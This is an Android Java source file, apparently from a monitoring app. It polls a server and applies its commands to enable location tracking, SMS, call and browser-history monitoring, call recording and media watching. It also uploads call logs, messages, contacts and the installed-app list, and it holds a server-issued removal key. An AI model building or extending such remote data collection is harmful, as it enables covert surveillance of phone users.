package com.inet.android.request;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Log;

import com.inet.android.db.OperationWithRecordInDataBase;
import com.inet.android.info.GetInfo;
import com.inet.android.list.TurnSendList;
import com.inet.android.sms.SmsSentObserver;
import com.inet.android.utils.Logging;

import custom.fileobserver.SetStateImage;

/**
 * Periodic request class is designed to handle the server's response
 * 
 * @author johny homicide
 * 
 */
public class PeriodicRequest extends DefaultRequest {
	private final String LOG_TAG = PeriodicRequest.class.getSimpleName()
			.toString();
	final private String additionURL = "api/periodic";
	SmsSentObserver smsSentObserver = null;
	private final int type = 3;
	boolean periodicalFlag = true;
	private Context ctx;
	public PeriodicRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String request) {
		PeriodicRequestTask frt = new PeriodicRequestTask();
		frt.execute(request);
	}

	class PeriodicRequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		String str = null;
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		try {
			str = Caller.doMake(null, sp.getString("access_second_token", ""),
					additionURL, true, null, ctx);
		} catch (IOException e) {
			e.printStackTrace();
			Logging.doLog(LOG_TAG, "IOException e PeriodicRequest",
					"IOException e PeriodicRequest");
		}
		if (str != null) {
			getRequestData(str);
		} else {
			Logging.doLog(LOG_TAG, "ответа от сервера нет или он некорректен",
					"ответа от сервера нет или он некорректен");
			// ----------record in the database ------------------
			OperationWithRecordInDataBase.insertRecord(null, type, null, null,
					null, ctx);
		}

	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		
		Editor ed = sp.edit();
		JSONObject jsonObject;
		try {
			jsonObject = new JSONObject(response);
		} catch (JSONException e) {
			return;
		}

		String str = null;
		
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("code_periodic", str);
		} else {
			ed.putString("code_periodic", "");
		}

		// -------------want to remove the device--------
		if (str.equals("3")) {
			Logging.doLog(LOG_TAG, "want to remove the device",
					"want to remove the device");
			String keyRemoval = null;
			try {
				keyRemoval = jsonObject.getString("key");
			} catch (JSONException e) {
				keyRemoval = null;
			}
			if (keyRemoval != null) {
				ed.putString("key_removal", keyRemoval);
			} else {
				ed.putString("key_removal", "");
			}
			return;
		}

		// ----------------errors-----------------
		if (str.equals("0")) {
			ParseToError.setError(response);
			return;
		}

		// -----------active mode-----------------
		if (str.equals("2")) {
			if (sp.getBoolean("getInfo", false) == true) {
				GetInfo getInfo = new GetInfo(ctx);
				getInfo.startGetInfo();
				ed.putBoolean("getInfo", false);
			}
			ed.putString("period", "1");
			ed.commit();
		}
		// ----------frequency location------------
		try {
			str = jsonObject.getString("geo");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("geo", str);
		} else {
			ed.putString("geo", "0");
		}
		// -----------positioning mode----------------
		try {
			str = jsonObject.getString("geo_mode");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("geo_mode", str);
		} else {
			ed.putString("geo_mode", "1");
		}
		// -----------monitoring sms----------------
		try {
			str = jsonObject.getString("sms");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("sms", str);

		} else {
			ed.putString("sms", "0");
		}
		// ------------monitoring of calls--------------
		try {
			str = jsonObject.getString("call");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("call", str);
		} else {
			ed.putString("call", "0");
		}
		// ----------monitoring browser history-----------
		try {
			str = jsonObject.getString("www");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("www", str);
		} else {
			ed.putString("www", "0");
		}

		// ----------record call-----------
		try {
			str = jsonObject.getString("recall");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("recall", str);
		} else {
			ed.putString("recall", "0");
		}

		// ----------time server-----------
		try {
			str = jsonObject.getString("UTCT");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("UTCT", str);
		} else {
			ed.putString("UTCT", "0");
		}

		// --------start time work------------
		try {
			str = jsonObject.getString("time_from");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("time_from", str);
		} else {
			ed.putString("time_from", "");
		}

		// ------------stop time---------------
		try {
			str = jsonObject.getString("time_to");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("time_to", str);
		} else {
			ed.putString("time_to", "");
		}

		// ---------lunchtime start-------------
		try {
			str = jsonObject.getString("brk_from");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("brk_from", str);
		} else {
			ed.putString("brk_from", "");
		}

		// ---------lunchtime stop----------------
		try {
			str = jsonObject.getString("brk_to");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("brk_to", str);
		} else {
			ed.putString("brk_to", "");
		}
		// ----------------image and audio detect----------------------
		String image = null;
		String audio = null;
		try {
			image = jsonObject.getString("image");
			audio = jsonObject.getString("audio");
		} catch (JSONException e) {
			str = null;
		}
		if (image != null && audio != null) {

			SetStateImage stateImage = SetStateImage.getInstance(ctx);
			Log.d(LOG_TAG, "stateImage" + stateImage.toString());
			ed.putString("image_state", image);
			ed.putString("audio_state", audio);
			if (image.equals("1") || audio.equals("1")) {
				if (stateImage.State() == false)
					stateImage.startWatcher();
			} else
				stateImage.stopWatcher();
		}
		// ----------------method of sending files----------------------
		try {
			str = jsonObject.getString("dispatch");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			ed.putString("dispatch", str);
		else
			ed.putString("dispatch", str);

		// ---------------calls list------------------------

		try {
			str = jsonObject.getString("calls_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0") && !sp.getString("list_call", "0").equals(str)) {
				TurnSendList.setList("1", str, null, ctx);
			}
		// ---------------sms list------------------------
		try {
			str = jsonObject.getString("sms_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0") && !sp.getString("list_sms", "0").equals(str)) {
				TurnSendList.setList("2", str, null, ctx);
			}

		// ---------------contacts list------------------------

		try {
			str = jsonObject.getString("contacts_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0")
					&& !sp.getString("list_contact", "0").equals(str)) {
				TurnSendList.setList("3", str, null, ctx);
			}
		// ---------------apps list------------------------

		try {
			str = jsonObject.getString("apps_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0") && !sp.getString("list_app", "0").equals(str)) {
				TurnSendList.setList("4", str, null, ctx);
			}

		if (str != null) {
			ed.putString("error", str);
		} else {
			ed.putString("error", "");
		}

		ed.commit();
	}

	@Override
	public void sendRequest(int request) {
		// TODO Auto-generated method stub

	}
}